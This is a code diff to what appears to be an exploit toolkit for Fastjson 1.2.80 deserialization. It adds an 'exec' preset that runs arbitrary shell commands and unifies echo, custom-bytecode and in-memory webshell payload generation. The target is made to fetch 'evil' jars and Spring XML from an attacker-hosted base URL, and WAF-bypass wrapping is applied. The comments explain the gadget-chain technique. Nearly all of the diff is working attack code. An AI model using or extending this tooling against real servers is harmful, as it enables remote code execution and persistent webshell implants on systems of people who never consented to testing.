@@ -9,33 +9,34 @@ from urllib.parse import urlparse, urlunparse
 
 import httpx
 
+from fastjson_toolkit.poc.bytecode import BytecodePresetOptions, resolve_bytecode_payload
 from fastjson_toolkit.poc.echo import (
-    build_echo_artifact,
     build_groovy_echo_jar,
+    build_groovy_exec_jar,
     build_spring_echo_xml,
     normalize_engine,
     supports_1280_echo,
 )
 from fastjson_toolkit.poc.getter import wrap_with_currency
 from fastjson_toolkit.poc.memshell import (
-    build_memshell_delivery,
-    generate_memshell,
     supports_1280_memshell,
     write_spring_memshell_attack_files,
 )
+from fastjson_toolkit.poc.v1_2_80.attack_assets import build_bean_exec_xml
 from fastjson_toolkit.poc.v1_2_80.catalog import get_gadget, list_gadgets
 from fastjson_toolkit.poc.v1_2_80.models import (
     Poc1280GenerateOptions,
     Poc1280GenerateResult,
     Poc1280SendOptions,
     Poc1280SendResult,
+    normalize_rce_preset,
 )
 from fastjson_toolkit.poc.v1_2_80.payloads import DEFAULT_ATTACK_BASE, build_steps
 from fastjson_toolkit.waf import apply_waf_payloads
 
 COMMON_NOTES = [
-    "RCE 证明：默认写文件（/tmp/fj1280_<gadget>）；开启 echo 时改为命令回显；"
-    "开启 memshell 时注入内存马（与 echo 互斥）。",
+    "RCE 证明：postgresql/jython/groovy 统一走预设 "
+    "file / custom / exec / echo / memshell（默认 file 写证明文件）。",
     "原理：双 @type 以 java.lang.Exception 作 expectClass，"
     "ThrowableDeserializer.cast → ParserConfig.getDeserializer 缓存字段类型后恢复利用类。",
     "1.2.83 起对 Throwable 子类从 mapping 取出后清空，本链失效。",
@@ -100,13 +101,17 @@ def _prepare_echo_assets(
         return None, classpath, jar_b64, None, notes
 
     # postgresql / jython：echo.jar + bean-echo.xml
-    art = build_echo_artifact(
-        engine=engine,
-        cmd_header=cmd_header,
-        default_cmd=cmd,
-        class_name="EchoPayload",
-        banner="FJ1280-ECHO",
+    art = resolve_bytecode_payload(
+        BytecodePresetOptions(
+            preset="echo",
+            engine=engine,
+            cmd_header=cmd_header,
+            cmd=cmd,
+            class_name="EchoPayload",
+        )
     )
+    if art is None:
+        raise RuntimeError("echo resolve 失败")
     jar_bytes = art.as_jar()
     jar_url = f"{base}/echo.jar"
     xml_bytes = build_spring_echo_xml(jar_url=jar_url, class_name=art.class_name)
@@ -120,6 +125,7 @@ def _prepare_echo_assets(
     except OSError:
         notes.append("无法写入 lab attack 目录；请托管 echo.jar + bean-echo.xml（见 result b64）")
     xml_url = f"{base}/bean-echo.xml"
+    notes.extend(art.notes)
     notes.append(
         f"Spring XML 回显：engine={engine}，Header {cmd_header}={cmd}；"
         f"socketFactoryArg → {xml_url}（XML 内拉 {jar_url}）"
@@ -149,22 +155,30 @@ def _prepare_memshell_assets(
     """返回 (socket_arg, classpath, jar_b64, xml_b64, info, connect, notes)。"""
     base = attack_base.rstrip("/")
     notes: list[str] = []
-    ms = generate_memshell(
-        backend=ms_api,
-        server=ms_server,
-        tool=ms_tool,
-        shell_type=ms_type,
-        url_pattern=ms_path,
-        jdk=ms_jdk,
-        static_initialize=False,
+    art = resolve_bytecode_payload(
+        BytecodePresetOptions(
+            preset="memshell",
+            ms_api=ms_api,
+            ms_server=ms_server,
+            ms_tool=ms_tool,
+            ms_type=ms_type,
+            ms_path=ms_path,
+            ms_jdk=ms_jdk,
+            ms_static_initialize=False,
+            ms_jar_url=f"{base}/memshell.jar",
+            ms_include_groovy=gadget == "groovy",
+        )
     )
-    info = ms.as_info_dict()
-    connect = ms.connect_info
+    if art is None:
+        raise RuntimeError("memshell resolve 失败")
+    delivery = (art.meta or {}).get("delivery")
+    if delivery is None:
+        raise RuntimeError("memshell delivery 缺失")
+    info = art.memshell_info or {}
+    connect = art.memshell_connect or ""
+    notes.extend(art.notes)
 
     if gadget == "groovy":
-        delivery = build_memshell_delivery(
-            ms, jar_url=f"{base}/memshell.jar", include_groovy=True
-        )
         if not delivery.groovy_jar_bytes:
             raise RuntimeError("Groovy 内存马 jar 生成失败")
         jar_b64 = base64.b64encode(delivery.groovy_jar_bytes).decode("ascii")
@@ -180,14 +194,13 @@ def _prepare_memshell_assets(
         classpath = f"{base}/evil-memshell.jar"
         notes.extend(delivery.notes)
         notes.append(
-            f"Groovy 内存马：{ms.tool}/{ms.shell_type}/{ms.server}；"
+            f"Groovy 内存马：{info.get('tool')}/{info.get('shell_type')}/{info.get('server')}；"
             f"classpathList → {classpath}"
         )
         notes.append("连接信息：\n" + connect)
         return None, classpath, jar_b64, None, info, connect, notes
 
     jar_url = f"{base}/memshell.jar"
-    delivery = build_memshell_delivery(ms, jar_url=jar_url)
     jar_b64 = base64.b64encode(delivery.jar_bytes).decode("ascii")
     xml_b64 = base64.b64encode(delivery.spring_xml_bytes).decode("ascii")
     try:
@@ -201,11 +214,51 @@ def _prepare_memshell_assets(
     xml_url = f"{base}/bean-memshell.xml"
     notes.extend(delivery.notes)
     notes.append(
-        f"Spring XML 内存马：{ms.tool}/{ms.shell_type}/{ms.server}；"
+        f"Spring XML 内存马：{info.get('tool')}/{info.get('shell_type')}/{info.get('server')}；"
         f"socketFactoryArg → {xml_url}（XML 内拉 {jar_url}）"
     )
     notes.append("连接信息：\n" + connect)
     return xml_url, None, jar_b64, xml_b64, info, connect, notes
+
+
+def _prepare_exec_assets(
+    gadget: str,
+    *,
+    cmd: str,
+    attack_base: str,
+) -> tuple[str | None, str | None, Optional[str], Optional[str], list[str]]:
+    """preset=exec：Spring XML / Groovy 自定义命令（非回显）。"""
+    base = attack_base.rstrip("/")
+    notes: list[str] = []
+    jar_b64: Optional[str] = None
+    xml_b64: Optional[str] = None
+    shell_cmd = cmd or "id"
+
+    if gadget == "groovy":
+        jar_bytes = build_groovy_exec_jar(cmd=shell_cmd)
+        jar_b64 = base64.b64encode(jar_bytes).decode("ascii")
+        out = _LAB_ATTACK / "evil-exec.jar"
+        try:
+            _LAB_ATTACK.mkdir(parents=True, exist_ok=True)
+            out.write_bytes(jar_bytes)
+            notes.append(f"已写入本地 {out}")
+        except OSError:
+            notes.append("无法写入 lab attack；请托管 evil-exec.jar（见 attack_jar_b64）")
+        classpath = f"{base}/evil-exec.jar"
+        notes.append(f"Groovy exec jar：cmd={shell_cmd}；classpathList → {classpath}")
+        return None, classpath, jar_b64, None, notes
+
+    xml_bytes = build_bean_exec_xml(shell_cmd)
+    xml_b64 = base64.b64encode(xml_bytes).decode("ascii")
+    try:
+        _LAB_ATTACK.mkdir(parents=True, exist_ok=True)
+        (_LAB_ATTACK / "bean-exec.xml").write_bytes(xml_bytes)
+        notes.append(f"已写入 {_LAB_ATTACK / 'bean-exec.xml'}")
+    except OSError:
+        notes.append("无法写入 lab attack；请托管 bean-exec.xml（见 attack_xml_b64）")
+    xml_url = f"{base}/bean-exec.xml"
+    notes.append(f"Spring XML exec：cmd={shell_cmd}；socketFactoryArg → {xml_url}")
+    return xml_url, None, jar_b64, xml_b64, notes
 
 
 def generate_poc_1280(
@@ -216,8 +269,13 @@ def generate_poc_1280(
 
     socket_arg = opts.socket_factory_arg
     classpath = opts.classpath
-    memshell_on = bool(opts.memshell)
-    echo_on = bool(opts.echo) and not memshell_on
+    kind = normalize_rce_preset(
+        opts.preset, echo=bool(opts.echo), memshell=bool(opts.memshell)
+    )
+    memshell_on = kind == "memshell"
+    echo_on = kind == "echo"
+    custom_on = kind == "custom" and entry.id in {"postgresql", "jython", "groovy"}
+    exec_on = kind == "exec" and entry.id in {"postgresql", "jython", "groovy"}
     engine = ""
     cmd_header = ""
     jar_b64: Optional[str] = None
@@ -227,8 +285,8 @@ def generate_poc_1280(
     extra_notes: list[str] = []
 
     if memshell_on:
-        if opts.echo:
-            extra_notes.append("memshell 与 echo 互斥，已优先内存马模式")
+        if opts.echo or opts.preset == "echo":
+            extra_notes.append("preset=memshell 优先于 echo")
         if not supports_1280_memshell(entry.id):
             raise ValueError(
                 f"gadget={entry.id} 不支持内存马；"
@@ -272,6 +330,51 @@ def generate_poc_1280(
             attack_base=attack_base,
         )
 
+    elif custom_on:
+        attack_base = (opts.attack_base or DEFAULT_ATTACK_BASE).rstrip("/")
+        art = resolve_bytecode_payload(
+            BytecodePresetOptions(
+                preset="custom",
+                class_b64=opts.class_b64,
+                class_name="CustomPayload",
+            )
+        )
+        if art is None:
+            raise RuntimeError("custom resolve 失败")
+        jar_bytes = art.as_jar()
+        jar_b64 = base64.b64encode(jar_bytes).decode("ascii")
+        if entry.id == "groovy":
+            classpath = f"{attack_base.rstrip('/')}/evil-custom.jar"
+            try:
+                _LAB_ATTACK.mkdir(parents=True, exist_ok=True)
+                (_LAB_ATTACK / "evil-custom.jar").write_bytes(jar_bytes)
+                extra_notes.append(f"已写入 {_LAB_ATTACK / 'evil-custom.jar'}")
+            except OSError:
+                extra_notes.append("无法写入 lab attack；请托管 evil-custom.jar")
+            extra_notes.append(f"自备字节码 Groovy jar；classpathList → {classpath}")
+        else:
+            jar_url = f"{attack_base.rstrip('/')}/custom.jar"
+            xml_bytes = build_spring_echo_xml(jar_url=jar_url, class_name=art.class_name)
+            xml_b64 = base64.b64encode(xml_bytes).decode("ascii")
+            socket_arg = f"{attack_base.rstrip('/')}/bean-custom.xml"
+            try:
+                _LAB_ATTACK.mkdir(parents=True, exist_ok=True)
+                (_LAB_ATTACK / "custom.jar").write_bytes(jar_bytes)
+                (_LAB_ATTACK / "bean-custom.xml").write_bytes(xml_bytes)
+                extra_notes.append("已写入 custom.jar 与 bean-custom.xml")
+            except OSError:
+                extra_notes.append("无法写入 lab attack；请托管 custom.jar + bean-custom.xml")
+            extra_notes.append(f"自备字节码；socketFactoryArg → {socket_arg}")
+        extra_notes.extend(art.notes)
+
+    elif exec_on:
+        attack_base = (opts.attack_base or DEFAULT_ATTACK_BASE).rstrip("/")
+        socket_arg, classpath, jar_b64, xml_b64, extra_notes = _prepare_exec_assets(
+            entry.id,
+            cmd=opts.cmd or "id",
+            attack_base=attack_base,
+        )
+
     steps_raw = build_steps(
         entry.id,
         file=opts.file,
@@ -297,7 +400,7 @@ def generate_poc_1280(
     notes.extend(extra_notes)
     if entry.steps > 1:
         notes.append(f"本 gadget 共 {len(steps)} 步，请按 steps 顺序发送。")
-    if not echo_on and not memshell_on:
+    if not echo_on and not memshell_on and not exec_on:
         notes.append(f"写文件证明：{entry.marker_file} ← {entry.marker_content!r}")
     if opts.wrap_currency:
         notes.append(
